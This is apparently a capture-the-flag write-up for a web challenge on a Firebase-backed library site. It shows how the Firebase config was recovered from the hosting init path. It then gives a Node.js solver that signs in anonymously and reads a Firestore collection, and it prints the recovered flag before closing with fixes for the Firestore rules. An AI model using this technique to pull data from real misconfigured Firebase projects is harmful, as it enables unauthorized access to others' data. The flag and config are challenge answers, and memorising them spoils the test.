# Eternal Flame

**Challenge**: Eternal Flame  
**Category**: Web Exploitation  
**Difficulty**: Easy  
**Author**: zeref  
**Flag**: `ghctf{th3_3t3rn4l_fl4m3_r3v34ls_h1dd3n_w1sd0m}`

## Summary
The challenge is a Firebase-backed static site for a digital Islamic library. The page hints at "default paths" and shows scholar/book paths that look like Firestore collection routes. By requesting Firebase Hosting's generated config at `/__/firebase/init.json`, we can recover the Firebase project details, sign in anonymously, and read the hinted Firestore collection. The flag is stored in the `flag` document under the `scholars/ibn-taymiyyah/wasitiyyah` collection.

## Recon
The page gives two important clues:

1. It references the "eternal flame" and hints at Firebase/default paths.
1. It lists scholar paths such as `/scholars/imam-malik/muwatta`, `/scholars/ibn-taymiyyah/wasitiyyah`, and `/scholars/imam-ahmad/musnad`.

Those paths are useful because Firestore paths alternate between collections and documents:

```text
collection/document/collection/document
```

So `/scholars/ibn-taymiyyah/wasitiyyah` can be read as:

```text
collection: scholars
document: ibn-taymiyyah
collection: wasitiyyah
```

## Vulnerability
Firebase client config is public by design, but exposing it makes the project easy to identify. The actual vulnerability is that the Firestore rules allow anonymous users to read the challenge data.

The Firebase config is available from the Firebase Hosting reserved initialization path:

```bash
curl http://localhost:8080/__/firebase/init.json
```

Response:

```json
{
  "apiKey": "AIzaSyB1kqIS-VeVk_KB4IlVE9vYBm7_7LGFrNQ",
  "authDomain": "greenhat-e5ed6.firebaseapp.com",
  "projectId": "greenhat-e5ed6",
  "storageBucket": "greenhat-e5ed6.firebasestorage.app",
  "messagingSenderId": "702590754082",
  "appId": "1:702590754082:web:b40770b4a154f30083997b",
  "measurementId": "G-550LT79K0N"
}
```

## Exploit Strategy
1. Fetch `/__/firebase/init.json`.
1. Extract the Firebase config.
1. Initialize the Firebase SDK with the recovered config.
1. Sign in anonymously.
1. List the hinted Firestore collection: `scholars/ibn-taymiyyah/wasitiyyah`.
1. Read the `flag` document from that collection.

## Solver Script
Create a small Node.js script using the Firebase SDK:

```javascript
const { initializeApp } = require("firebase/app");
const { getAuth, signInAnonymously } = require("firebase/auth");
const { getFirestore, collection, getDocs, doc, getDoc } = require("firebase/firestore");

const firebaseConfig = {
  apiKey: "AIzaSyB1kqIS-VeVk_KB4IlVE9vYBm7_7LGFrNQ",
  authDomain: "greenhat-e5ed6.firebaseapp.com",
  projectId: "greenhat-e5ed6",
  storageBucket: "greenhat-e5ed6.firebasestorage.app",
  messagingSenderId: "702590754082",
  appId: "1:702590754082:web:b40770b4a154f30083997b",
  measurementId: "G-550LT79K0N"
};

async function main() {
  const app = initializeApp(firebaseConfig);
  const auth = getAuth(app);
  const db = getFirestore(app);

  await signInAnonymously(auth);
  console.log("[+] Signed in anonymously");

  const wasitiyyahRef = collection(db, "scholars", "ibn-taymiyyah", "wasitiyyah");
  const snapshot = await getDocs(wasitiyyahRef);

  snapshot.forEach((item) => {
    console.log(item.id, "=>", item.data());
  });

  const flagRef = doc(db, "scholars", "ibn-taymiyyah", "wasitiyyah", "flag");
  const flagDoc = await getDoc(flagRef);

  if (flagDoc.exists()) {
    const data = flagDoc.data();
    console.log("Flag:", data.flag);
    console.log("Message:", data.message);
  }
}

main().catch(console.error);
```

## Run
Install the Firebase SDK, then run the solver:

```bash
npm install firebase
node sol.js
```

## Result
The `flag` document contains:

```text
ghctf{th3_3t3rn4l_fl4m3_r3v34ls_h1dd3n_w1sd0m}
```

## Fixes
1. Do not rely on hidden Firebase paths for security.
1. Treat Firebase client config as public.
1. Lock Firestore reads to the minimum required users and paths.
1. Avoid broad rules such as `allow read: if request.auth != null` for sensitive data.
1. Store flags, secrets, and admin-only data outside client-readable Firestore collections.
